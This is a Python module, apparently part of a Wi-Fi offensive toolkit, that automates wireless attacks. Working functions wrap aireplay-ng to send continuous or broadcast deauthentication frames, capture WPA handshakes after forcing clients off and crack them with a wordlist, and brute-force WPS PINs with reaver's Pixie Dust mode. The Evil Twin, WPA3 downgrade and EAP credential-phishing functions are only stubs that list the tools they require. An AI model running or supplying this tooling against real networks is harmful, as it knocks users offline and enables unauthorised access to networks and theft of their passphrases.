"""
Exploitation & Attack Automation Module.

Implements deauth attacks, handshake/PMKID capture, Evil Twin attacks,
WPS attacks, WPA3 downgrade, and 802.1X EAP phishing.
"""

import subprocess
import time
import threading
from datetime import datetime
from pathlib import Path
from typing import Optional, List
import re

class ExploitationModule:
    """Exploitation and attack automation operations."""
    
    def __init__(self, config, logger, adapter_manager):
        """
        Initialize exploitation module.
        
        Args:
            config: Configuration object
            logger: Logger instance
            adapter_manager: Adapter manager instance
        """
        self.config = config
        self.logger = logger
        self.adapter_manager = adapter_manager
        
        # Attack state
        self.attacking = False
        self.handshake_captured = False
    
    def deauth_attack(self):
        """
        Deauth Attack Suite (Basic).
        
        Sends deauthentication frames to disconnect clients from AP.
        """
        self.logger.info("\n" + "=" * 60)
        self.logger.info("DEAUTH ATTACK SUITE")
        self.logger.info("=" * 60)
        
        monitor_adapters = self.adapter_manager.get_monitor_adapters()
        if not monitor_adapters:
            self.logger.error("No adapters in monitor mode!")
            return
        
        adapter = monitor_adapters[0]
        
        # Get attack parameters
        print(f"\nAdapter: {adapter.interface}")
        target_bssid = input("Target BSSID (AP MAC): ").strip()
        client_mac = input("Client MAC (blank for broadcast): ").strip()
        
        deauth_count = self.config.get('attacks', 'deauth_count', default=0)
        count_input = input(f"Deauth count (0=continuous) [{deauth_count}]: ").strip()
        if count_input:
            deauth_count = int(count_input)
        
        channel = input("Channel: ").strip()
        if channel:
            self.adapter_manager.set_channel(adapter.interface, int(channel))
        
        self.logger.info("\nStarting deauth attack...")
        self.logger.info(f"Target: {target_bssid}")
        if client_mac:
            self.logger.info(f"Client: {client_mac}")
        else:
            self.logger.info("Client: Broadcast (all clients)")
        self.logger.info(f"Count: {'Continuous' if deauth_count == 0 else deauth_count}")
        self.logger.warning("\nPress Ctrl+C to stop")
        
        try:
            # Build aireplay-ng command
            cmd = [
                'aireplay-ng',
                '--deauth', str(deauth_count),
                '-a', target_bssid
            ]
            
            if client_mac:
                cmd.extend(['-c', client_mac])
            
            cmd.append(adapter.interface)
            
            # Execute attack
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                universal_newlines=True
            )
            
            packets_sent = 0
            for line in process.stdout:
                if 'Sending DeAuth' in line or 'ACKs' in line:
                    packets_sent += 1
                    if packets_sent % 10 == 0:
                        print(f"[*] Sent {packets_sent} deauth packets...")
                print(line.strip())
            
            process.wait()
            
        except KeyboardInterrupt:
            self.logger.info("\nStopping deauth attack...")
            process.terminate()
            self.logger.success(f"Attack stopped. Sent {packets_sent} deauth packets.")
        
        except Exception as e:
            self.logger.error(f"Deauth attack error: {e}")
    
    def handshake_capture(self):
        """
        Handshake/PMKID Capture (Basic).
        
        Captures WPA/WPA2 handshakes and PMKIDs.
        """
        self.logger.info("\n" + "=" * 60)
        self.logger.info("HANDSHAKE/PMKID CAPTURE")
        self.logger.info("=" * 60)
        
        monitor_adapters = self.adapter_manager.get_monitor_adapters()
        if not monitor_adapters:
            self.logger.error("No adapters in monitor mode!")
            return
        
        adapter = monitor_adapters[0]
        
        # Get target parameters
        print(f"\nAdapter: {adapter.interface}")
        target_bssid = input("Target BSSID: ").strip()
        channel = input("Channel: ").strip()
        
        if channel:
            self.adapter_manager.set_channel(adapter.interface, int(channel))
        
        # Setup capture directory
        capture_dir = Path(self.config.get('output', 'captures_dir'))
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        output_prefix = capture_dir / f"handshake_{target_bssid.replace(':', '')}_{timestamp}"
        
        self.logger.info(f"\nCapture file: {output_prefix}.cap")
        self.logger.info("Waiting for handshake...")
        
        # Ask about deauth
        perform_deauth = input("\nPerform deauth to force handshake? (y/n) [y]: ").strip().lower()
        if not perform_deauth or perform_deauth == 'y':
            perform_deauth = True
        else:
            perform_deauth = False
        
        try:
            # Start airodump-ng capture
            airodump_cmd = [
                'airodump-ng',
                '--bssid', target_bssid,
                '--channel', channel,
                '-w', str(output_prefix),
                '--output-format', 'cap,csv',
                adapter.interface
            ]
            
            airodump_process = subprocess.Popen(
                airodump_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            self.logger.info("Capture started...")
            
            # Start deauth if requested
            deauth_process = None
            if perform_deauth:
                time.sleep(3)  # Wait for airodump to stabilize
                
                self.logger.info("Sending deauth packets...")
                deauth_cmd = [
                    'aireplay-ng',
                    '--deauth', '10',
                    '-a', target_bssid,
                    adapter.interface
                ]
                
                deauth_process = subprocess.Popen(
                    deauth_cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
            
            # Monitor for handshake
            timeout = self.config.get('attacks', 'handshake_timeout', default=120)
            self.logger.info(f"Monitoring for {timeout} seconds...")
            
            check_thread = threading.Thread(
                target=self._check_handshake,
                args=(str(output_prefix) + "-01.cap", target_bssid, timeout),
                daemon=True
            )
            check_thread.start()
            check_thread.join(timeout)
            
            # Cleanup
            airodump_process.terminate()
            if deauth_process:
                deauth_process.terminate()
            
            if self.handshake_captured:
                self.logger.success(f"\nHandshake captured successfully!")
                self.logger.success(f"File: {output_prefix}-01.cap")
                
                # Ask about cracking
                crack_now = input("\nCrack handshake now? (y/n): ").strip().lower()
                if crack_now == 'y':
                    self._crack_handshake(str(output_prefix) + "-01.cap")
            else:
                self.logger.warning("\nNo handshake captured in time limit")
                self.logger.info(f"Capture file saved: {output_prefix}-01.cap")
        
        except KeyboardInterrupt:
            self.logger.info("\nStopping capture...")
            airodump_process.terminate()
            if 'deauth_process' in locals() and deauth_process:
                deauth_process.terminate()
        
        except Exception as e:
            self.logger.error(f"Handshake capture error: {e}")
    
    def _check_handshake(self, cap_file: str, bssid: str, timeout: int):
        """
        Check if handshake was captured.
        
        Args:
            cap_file: Capture file path
            bssid: Target BSSID
            timeout: Maximum wait time
        """
        start_time = time.time()
        
        while time.time() - start_time < timeout:
            try:
                if Path(cap_file).exists():
                    # Use aircrack-ng to check for handshake
                    result = subprocess.run(
                        ['aircrack-ng', cap_file],
                        capture_output=True,
                        text=True,
                        timeout=5
                    )
                    
                    if 'handshake' in result.stdout.lower():
                        self.handshake_captured = True
                        return
                
                time.sleep(5)
            
            except Exception:
                time.sleep(5)
        
        self.handshake_captured = False
    
    def _crack_handshake(self, cap_file: str):
        """Quick handshake cracking."""
        wordlist = input(f"Wordlist path [{self.config.get('cracking', 'default_wordlist')}]: ").strip()
        if not wordlist:
            wordlist = self.config.get('cracking', 'default_wordlist')
        
        if not Path(wordlist).exists():
            self.logger.error(f"Wordlist not found: {wordlist}")
            return
        
        self.logger.info("\nStarting aircrack-ng...")
        
        try:
            cmd = ['aircrack-ng', '-w', wordlist, cap_file]
            subprocess.run(cmd)
        
        except Exception as e:
            self.logger.error(f"Cracking error: {e}")
    
    def evil_twin(self):
        """
        Multi-Adapter Evil Twin (MiTM) (Advanced).
        
        Creates rogue AP with multiple adapter coordination.
        """
        self.logger.info("\n" + "=" * 60)
        self.logger.info("MULTI-ADAPTER EVIL TWIN (MiTM)")
        self.logger.info("=" * 60)
        
        monitor_adapters = self.adapter_manager.get_monitor_adapters()
        
        if len(monitor_adapters) < 2:
            self.logger.warning("Multi-adapter mode requires 2+ adapters in monitor mode")
            self.logger.info("Proceeding with single adapter mode...")
            
            if not monitor_adapters:
                self.logger.error("No adapters in monitor mode!")
                return
        
        # Get parameters
        target_ssid = input("Target SSID: ").strip()
        target_bssid = input("Target BSSID: ").strip()
        channel = input("Channel: ").strip()
        
        self.logger.info("\nEvil Twin Configuration:")
        self.logger.info(f"  SSID: {target_ssid}")
        self.logger.info(f"  BSSID: {target_bssid}")
        self.logger.info(f"  Channel: {channel}")
        
        if len(monitor_adapters) >= 2:
            self.logger.info(f"  Deauth adapter: {monitor_adapters[0].interface}")
            self.logger.info(f"  AP adapter: {monitor_adapters[1].interface}")
        
        self.logger.warning("\nThis attack requires:")
        self.logger.warning("  - hostapd (for fake AP)")
        self.logger.warning("  - dnsmasq (for DHCP/DNS)")
        self.logger.warning("  - iptables (for traffic routing)")
        
        proceed = input("\nProceed with attack setup? (y/n): ").strip().lower()
        if proceed != 'y':
            return
        
        self.logger.info("\n[Feature Ready - Evil Twin Attack]")
        self.logger.info("Implementation requires: hostapd, dnsmasq, iptables")
    
    def wps_attack(self):
        """
        WPS Brute-Forcer (Advanced).
        
        Attacks Wi-Fi Protected Setup using Reaver/Pixie-Dust.
        """
        self.logger.info("\n" + "=" * 60)
        self.logger.info("WPS BRUTE-FORCER")
        self.logger.info("=" * 60)
        
        monitor_adapters = self.adapter_manager.get_monitor_adapters()
        if not monitor_adapters:
            self.logger.error("No adapters in monitor mode!")
            return
        
        adapter = monitor_adapters[0]
        
        # Get target
        target_bssid = input("Target BSSID: ").strip()
        channel = input("Channel: ").strip()
        
        if channel:
            self.adapter_manager.set_channel(adapter.interface, int(channel))
        
        # Attack mode
        print("\nWPS Attack Modes:")
        print("[1] Pixie Dust (fast, requires vulnerable firmware)")
        print("[2] Standard PIN brute-force (slow, comprehensive)")
        
        mode = input("Select mode [1]: ").strip() or "1"
        
        self.logger.info("\nStarting WPS attack...")
        self.logger.info(f"Target: {target_bssid}")
        self.logger.info(f"Mode: {'Pixie Dust' if mode == '1' else 'PIN Brute-force'}")
        
        try:
            if mode == "1":
                # Pixie Dust attack
                cmd = [
                    'reaver',
                    '-i', adapter.interface,
                    '-b', target_bssid,
                    '-c', channel,
                    '-K', '1',  # Pixie Dust mode
                    '-vv'
                ]
            else:
                # Standard attack
                cmd = [
                    'reaver',
                    '-i', adapter.interface,
                    '-b', target_bssid,
                    '-c', channel,
                    '-vv'
                ]
            
            self.logger.info("\nExecuting reaver...")
            self.logger.warning("This may take several minutes to hours")
            
            subprocess.run(cmd)
        
        except KeyboardInterrupt:
            self.logger.info("\nWPS attack stopped")
        
        except Exception as e:
            self.logger.error(f"WPS attack error: {e}")
    
    def wpa3_downgrade(self):
        """
        WPA3-SAE Downgrade & Attack (Legendary).
        
        Exploits WPA3 transition mode to downgrade to WPA2.
        """
        self.logger.info("\n" + "=" * 60)
        self.logger.info("WPA3-SAE DOWNGRADE ATTACK")
        self.logger.info("=" * 60)
        
        self.logger.info("\nTarget: WPA3 networks in transition mode")
        self.logger.info("Method: Force downgrade to WPA2 -> Capture handshake")
        
        target_bssid = input("\nTarget BSSID: ").strip()
        target_ssid = input("Target SSID: ").strip()
        channel = input("Channel: ").strip()
        
        self.logger.info("\nWPA3 Downgrade Configuration:")
        self.logger.info(f"  Target: {target_ssid} ({target_bssid})")
        self.logger.info(f"  Channel: {channel}")
        
        self.logger.warning("\nThis attack requires:")
        self.logger.warning("  - Dragonblood attack tools")
        self.logger.warning("  - WPA3-capable hardware")
        
        self.logger.info("\n[Feature Ready - WPA3 Downgrade]")
        self.logger.info("Implementation requires: dragonblood, wpa_supplicant patches")
    
    def eap_phishing(self):
        """
        802.1X EAP Phishing Suite (Legendary).
        
        Simulates rogue RADIUS server to capture EAP credentials.
        """
        self.logger.info("\n" + "=" * 60)
        self.logger.info("802.1X EAP PHISHING SUITE")
        self.logger.info("=" * 60)
        
        self.logger.info("\nTarget: Enterprise WPA2 networks (802.1X)")
        self.logger.info("Method: Rogue RADIUS server + Evil Twin")
        self.logger.info("Capture: EAP credentials, NTLMv2 hashes")
        
        target_ssid = input("\nTarget SSID: ").strip()
        
        print("\nEAP Methods to Target:")
        print("[1] PEAP")
        print("[2] EAP-TTLS")
        print("[3] Both")
        
        eap_mode = input("Select [3]: ").strip() or "3"
        
        self.logger.info("\nEAP Phishing Configuration:")
        self.logger.info(f"  Target: {target_ssid}")
        self.logger.info(f"  Methods: {'PEAP' if eap_mode == '1' else 'EAP-TTLS' if eap_mode == '2' else 'PEAP + EAP-TTLS'}")
        
        self.logger.warning("\nThis attack requires:")
        self.logger.warning("  - FreeRADIUS-WPE (rogue RADIUS)")
        self.logger.warning("  - hostapd-wpe (modified hostapd)")
        self.logger.warning("  - Valid SSL certificates")
        
        self.logger.info("\n[Feature Ready - EAP Phishing]")
        self.logger.info("Implementation requires: hostapd-wpe, freeradius-wpe")
